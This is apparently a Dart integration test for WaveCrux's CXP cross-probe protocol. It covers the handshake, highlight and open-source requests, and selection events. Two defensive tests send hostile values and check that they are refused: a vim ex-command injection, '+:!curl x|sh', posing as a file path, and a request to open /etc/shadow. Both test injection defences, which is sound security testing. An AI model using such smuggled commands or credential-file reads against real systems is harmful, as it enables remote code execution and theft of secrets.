// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

import 'dart:io';

import 'package:crux_cxp/crux_cxp.dart';
import 'package:crux_cxp_ui/crux_cxp_ui.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:wavecrux/domain/enums/scope_type.dart';
import 'package:wavecrux/domain/enums/var_direction.dart';
import 'package:wavecrux/domain/enums/var_type.dart';
import 'package:wavecrux/domain/models/app_settings.dart';
import 'package:wavecrux/domain/models/scope.dart';
import 'package:wavecrux/domain/models/variable.dart';
import 'package:wavecrux/features/settings/providers/settings_providers.dart';
import 'package:wavecrux/features/viewer/providers/signal_group_providers.dart';
import 'package:wavecrux/features/viewer/providers/waveform_source_provider.dart';
import 'package:wavecrux/services/remote/cxp/cxp_inbound_handlers.dart';
import 'package:wavecrux/services/remote/cxp/cxp_selection_emitter_provider.dart';
import 'package:wavecrux/services/remote/cxp/cxp_workspace_link.dart';
import 'package:wavecrux/services/remote/cxp/wavecrux_cxp_binding.dart';
import 'package:wavecrux/services/remote/cxp/wavecrux_cxp_request_handler.dart';
import 'package:wavecrux/services/remote/remote_control_notifier.dart';
import 'package:wavecrux/services/settings/settings_service.dart';

import '../../../helpers/fake_waveform_data_source.dart';
import '../../../helpers/platform_absolute_path.dart';
import '../../../helpers/product_telemetry_config.dart';
import '../../../helpers/wait_for.dart';
import 'cxp_round_trip_barrier.dart';

/// End-to-end integration test for CXP on the shared lifecycle. Walks the full
/// pipeline: handshake → Subscribe → inbound RequestHighlight changes WaveCrux
/// state → one ack → inbound RequestOpenSource invokes the editor runner → ack
/// → outbound NotifySelection appears on subscribed peers.
///
/// Uses the real shared runtime (`cruxCxpRuntimeProvider`) with WaveCrux's real
/// request handler and targeted overrides for the editor-command runner, the
/// manifest directory and AppSettings/SettingsService backing so the test does
/// not touch the real filesystem outside of a per-test temp dir or spawn an
/// external editor process.
void main() {
  late Directory tempDir;
  late ProviderContainer container;
  late LocalCxpClient client;
  late List<(String, String)> editorRunnerCalls;
  late int attentionRequests;

  Scope buildScope() => const Scope(
    name: 'top',
    path: 'top',
    type: ScopeType.module,
    variables: [
      Variable(
        name: 'clk',
        varType: VarType.wire,
        direction: VarDirection.input,
        signalRef: 'top.clk',
        scopePath: 'top',
        bitWidth: 1,
      ),
    ],
  );

  setUpAll(() {
    TestWidgetsFlutterBinding.ensureInitialized();
    PackageInfo.setMockInitialValues(
      appName: 'WaveCrux',
      packageName: 'com.ferriteengineering.wavecrux',
      version: '0.0.0-test',
      buildNumber: '0',
      buildSignature: '',
    );
  });

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    tempDir = await Directory.systemTemp.createTemp('wavecrux_cxp_int_');
    editorRunnerCalls = [];
    attentionRequests = 0;

    container = ProviderContainer(
      overrides: [
        productTelemetryConfig,
        cruxCxpProductBindingProvider.overrideWithValue(kWaveCruxCxpBinding),
        // Pin the manifest directory under our temp dir so the discovery
        // service does not write to the real shared directory.
        cruxCxpManifestDirectoryProvider.overrideWith(
          (_) async => tempDir.path,
        ),
        // The test platform is not a desktop, so name the transport. Port 0
        // lets the OS pick, so parallel test runs never collide.
        cruxCxpTransportAvailableProvider.overrideWithValue(true),
        cruxCxpLaunchSettingsProvider.overrideWithValue(
          const CruxCxpSettings(enabled: true, port: 0),
        ),
        cruxCxpRequestHandlerProvider.overrideWith(
          WaveCruxCxpRequestHandler.new,
        ),
        // The seam the runtime calls once for an honoured request.
        cruxCxpAttentionRequesterProvider.overrideWithValue(
          () => attentionRequests++,
        ),
        // CXP §11's containment rule over a fixed root. The production
        // callback reads the open tabs and the recent-files list; this
        // container has neither, so it would report nothing open and refuse
        // every path a peer sends. The rule object is the real one: only
        // where its roots come from is fixed here.
        cxpPathContainmentProvider.overrideWithValue(
          CxpPathContainment(roots: () => <String>[platformAbsolute('/rtl')]),
        ),
        // Pre-load AppSettings synchronously with a configured editor
        // command so the request_open_source handler reaches the runner.
        settingsServiceProvider.overrideWithValue(
          const _FakeSettingsService(
            AppSettings(cxpEditorCommand: 'fake-editor -g'),
          ),
        ),
        // Pre-populate the waveform source with our test fixture so the
        // RequestHighlight signal lookup succeeds.
        waveformSourceProvider.overrideWith(
          () => _PreloadedSourceNotifier(
            FakeWaveformDataSource(scopes: [buildScope()]),
          ),
        ),
        // Capture editor runner invocations without launching a process.
        cxpEditorCommandRunnerProvider.overrideWithValue(
          (command, target) async {
            editorRunnerCalls.add((command, target));
            return CruxCxpHandlerResult.ok;
          },
        ),
      ],
    );

    // Resolve the AppSettings future so the inbound open-source handler
    // sees a non-null value when it reads `.value`.
    await container.read(appSettingsProvider.future);

    // Start the shared runtime on an OS-assigned port.
    final runtime = await container.read(cruxCxpRuntimeProvider.future);
    expect(runtime, isNotNull, reason: 'the shared runtime should start');
    expect(runtime!.isAvailable, isTrue, reason: runtime.unavailableReason);
    // The event log follows the runtime from the moment something reads it.
    container.listen(cruxCxpEventLogProvider, (_, _) {});

    // Connect a test client peer and complete the Hello handshake.
    client = LocalCxpClient(
      selfIdentity: const PeerIdentity(
        peerId: 'integration-test-client',
        productName: 'integration-test',
        productVersion: '0.0.0',
      ),
    );
    await client.connect(
      host: '127.0.0.1',
      port: runtime.boundPort!,
      token: cxpProcessAuthToken,
    );
    expect(client.isConnected, isTrue);
  });

  tearDown(() async {
    await client.dispose();
    // Disposing the container stops the runtime and removes its manifest.
    container.dispose();
    await Future<void>.delayed(const Duration(milliseconds: 200));
    if (tempDir.existsSync()) {
      tempDir.deleteSync(recursive: true);
    }
  });

  test('handshake completes — remote peer identifies as wavecrux', () async {
    expect(client.remotePeer?.productName, 'wavecrux');
  });

  test(
    'the binding is what the peer sees: capabilities and accepted kinds',
    () {
      final capabilities = client.remotePeer!.capabilities;
      expect(capabilities, containsAll(kWaveCruxCxpBinding.capabilities));
      for (final kind in kWaveCruxCxpBinding.acceptedKinds) {
        expect(capabilities, contains('cxp.accepts:${kind.name}'));
      }
    },
  );

  test(
    'the runtime surfaces connector dial failures as unreachable peers',
    () async {
      container.listen(cruxCxpUnreachablePeersProvider, (_, _) {});
      // Reserve then release a port: a manifest pointing at it is a peer we
      // will discover but never be able to dial, the exact one-way-
      // connectivity case the indicator exposes.
      final probe = await ServerSocket.bind('127.0.0.1', 0);
      final deadPort = probe.port;
      await probe.close();

      final writer = CxpManifestWriter(manifestDirectory: tempDir.path);
      await writer.write(
        identity: const PeerIdentity(
          peerId: 'deadcrux-1-2',
          productName: 'deadcrux',
          productVersion: '0.1.0',
        ),
        host: '127.0.0.1',
        port: deadPort,
      );

      await waitFor(
        () => (container.read(cruxCxpUnreachablePeersProvider).value ?? []).any(
          (f) => f.peerId == 'deadcrux-1-2',
        ),
        timeout: const Duration(seconds: 15),
        reason:
            'the runtime should push the connector dial failure so the panel '
            'can render it',
      );
      final failure = container
          .read(cruxCxpUnreachablePeersProvider)
          .value!
          .firstWhere((f) => f.peerId == 'deadcrux-1-2');
      expect(failure.port, deadPort);
    },
  );

  test(
    'inbound RequestHighlight changes selectedSignalProvider + acks once',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      final acks = <RequestHighlightAck>[];
      final sub = inbound
          .where((e) => e.message is RequestHighlightAck)
          .listen((e) => acks.add(e.message as RequestHighlightAck));
      addTearDown(sub.cancel);
      client.send(
        const RequestHighlight(
          element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
        ),
      );
      await waitFor(() => acks.isNotEmpty);
      expect(acks.single.honored, isTrue);
      // Wait for the post-ack Riverpod state update to settle.
      await waitFor(
        () => container.read(selectedSignalProvider) == 'top.clk',
      );
      expect(container.read(selectedSignalProvider), 'top.clk');
      final entries = container.read(signalGroupsProvider).entries;
      expect(entries.map((e) => e.signalRef), contains('top.clk'));
      // The runtime sends the acknowledgement; the handler never does, so a
      // second one would be the double ack.
      await cxpRoundTripBarrier(client);
      expect(acks, hasLength(1), reason: 'one request, one acknowledgement');
    },
  );

  test(
    'an honoured request asks for attention once, a refused one never',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      client.send(
        const RequestHighlight(
          element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
        ),
      );
      await inbound
          .firstWhere((e) => e.message is RequestHighlightAck)
          .timeout(const Duration(seconds: 2));
      expect(attentionRequests, 1);

      client.send(
        const RequestHighlight(
          element: ElementId(kind: ElementKind.signal, path: 'top.nope'),
        ),
      );
      final refused = await inbound
          .firstWhere((e) => e.message is RequestHighlightAck)
          .timeout(const Duration(seconds: 2));
      expect((refused.message as RequestHighlightAck).honored, isFalse);
      expect(
        attentionRequests,
        1,
        reason: 'a refusal does not bounce the dock',
      );
    },
  );

  test('with request-attention off an honoured request does not ask', () async {
    await container
        .read(cruxCxpSettingsProvider.notifier)
        .setRequestAttention(requestAttention: false);
    final inbound = client.inbound.asBroadcastStream();
    client.send(
      const RequestHighlight(
        element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
      ),
    );
    final ack = await inbound
        .firstWhere((e) => e.message is RequestHighlightAck)
        .timeout(const Duration(seconds: 2));
    expect((ack.message as RequestHighlightAck).honored, isTrue);
    expect(attentionRequests, 0);
  });

  test('inbound RequestOpenSource invokes the editor runner + acks', () async {
    final inbound = client.inbound.asBroadcastStream();
    final cpuV = platformAbsolute('/rtl/cpu.v');
    client.send(
      RequestOpenSource(
        filePath: cpuV,
        line: 42,
        column: 7,
      ),
    );
    final ackEvent = await inbound
        .firstWhere((e) => e.message is RequestOpenSourceAck)
        .timeout(const Duration(seconds: 2));
    final ack = ackEvent.message as RequestOpenSourceAck;
    expect(ack.honored, isTrue);
    expect(editorRunnerCalls, [
      ('fake-editor -g', '$cpuV:42:7'),
    ]);
  });

  // The socket-level proof of the containment: this string is authored by
  // whoever connected, and to vim an argv element beginning with `+` is an
  // ex command rather than a filename. The refusal has to happen before the
  // runner is reached, and the peer has to be told why.
  test(
    'inbound RequestOpenSource refuses a file_path that is not a path',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      client.send(
        const RequestOpenSource(filePath: '+:!curl x|sh', line: 42),
      );
      final ackEvent = await inbound
          .firstWhere((e) => e.message is RequestOpenSourceAck)
          .timeout(const Duration(seconds: 2));
      final ack = ackEvent.message as RequestOpenSourceAck;
      expect(ack.honored, isFalse);
      expect(ack.reason, contains('absolute path'));
      expect(editorRunnerCalls, isEmpty, reason: 'no editor may be launched');
    },
  );

  // CXP §11's SHOULD, proven over a real socket: `/etc/shadow` is a perfectly
  // absolute path, and every check the four products carried before wire 1.2
  // would have let it through to the editor argv. `LocalCxpServer` screens
  // the wire with the floor (its one rule also screens a
  // `request_open_artifact` hint, which must not be rooted), so the refusal
  // comes from `dispatchCxpOpenSource`'s rooted check, before the runner is
  // reached, and rides back as the ack's reason without repeating the path
  // (CXP §9.11).
  //
  // MUTATION: deleting the `refuse` check in `dispatchCxpOpenSource` turns
  // this red.
  test(
    'inbound RequestOpenSource refuses a path outside the open directories',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      final shadow = platformAbsolute('/etc/shadow');
      client.send(RequestOpenSource(filePath: shadow, line: 1));
      final ackEvent = await inbound
          .firstWhere((e) => e.message is RequestOpenSourceAck)
          .timeout(const Duration(seconds: 2));
      final ack = ackEvent.message as RequestOpenSourceAck;
      expect(ack.honored, isFalse);
      expect(ack.reason, contains('outside the directories'));
      expect(ack.reason, isNot(contains(shadow)));
      expect(editorRunnerCalls, isEmpty, reason: 'no editor may be launched');
    },
  );

  test('outbound NotifySelection reaches a subscribed peer when the local '
      'selection changes', () async {
    final inbound = client.inbound.asBroadcastStream();
    // Subscribe to notify_selection on the client side.
    client.send(
      const Subscribe(
        subscriptions: [
          CxpSubscription(messageKind: CxpMessageKind.notifySelection),
        ],
      ),
    );
    await cxpRoundTripBarrier(client);

    // Read the selection-emitter provider so it begins listening, then
    // change the selection: the emitter's signal-selection broadcast should
    // land on the client.
    container.read(cxpSelectionEmitterProvider);
    container.read(selectedSignalProvider.notifier).select('top.clk');
    final event = await inbound
        .firstWhere((e) => e.message is NotifySelection)
        .timeout(const Duration(seconds: 2));
    final ns = event.message as NotifySelection;
    expect(ns.elements.single.kind, ElementKind.signal);
    expect(ns.elements.single.path, 'top.clk');
  });

  test('event log records both inbound and outbound traffic', () async {
    final inbound = client.inbound.asBroadcastStream();
    // Subscribe so the broadcast actually fires.
    client.send(
      const Subscribe(
        subscriptions: [
          CxpSubscription(messageKind: CxpMessageKind.notifySelection),
        ],
      ),
    );
    await cxpRoundTripBarrier(client);
    container.read(cxpSelectionEmitterProvider);
    container.read(selectedSignalProvider.notifier).select('top.clk');
    // Wait for the outbound notify_selection to flush.
    await inbound
        .firstWhere((e) => e.message is NotifySelection)
        .timeout(const Duration(seconds: 2));

    // Also send an inbound request to confirm both directions get logged.
    client.send(
      const RequestHighlight(
        element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
      ),
    );
    await inbound
        .firstWhere((e) => e.message is RequestHighlightAck)
        .timeout(const Duration(seconds: 2));

    // Wait for the event-log notifier to record both entries.
    bool has(CrossProbeEventKind kind) =>
        container.read(cruxCxpEventLogProvider).any((e) => e.kind == kind);
    await waitFor(
      () =>
          has(CrossProbeEventKind.selectionSent) &&
          has(CrossProbeEventKind.highlightReceived),
    );
    expect(
      has(CrossProbeEventKind.selectionSent),
      isTrue,
      reason: 'outbound notify_selection should be in the event log',
    );
    expect(
      has(CrossProbeEventKind.highlightReceived),
      isTrue,
      reason: 'inbound request_highlight should be in the event log',
    );
  });
}

// ── Helpers ─────────────────────────────────────────────────────────────────

class _FakeSettingsService implements WaveCruxSettingsService {
  const _FakeSettingsService(this._settings);
  final AppSettings _settings;
  @override
  Future<AppSettings> load() async => _settings;
  @override
  Future<void> save(AppSettings settings) async {}
}

class _PreloadedSourceNotifier extends WaveformSourceNotifier {
  _PreloadedSourceNotifier(this._source);
  final FakeWaveformDataSource _source;
  @override
  AsyncValue<FakeWaveformDataSource> build() => AsyncData(_source);
}
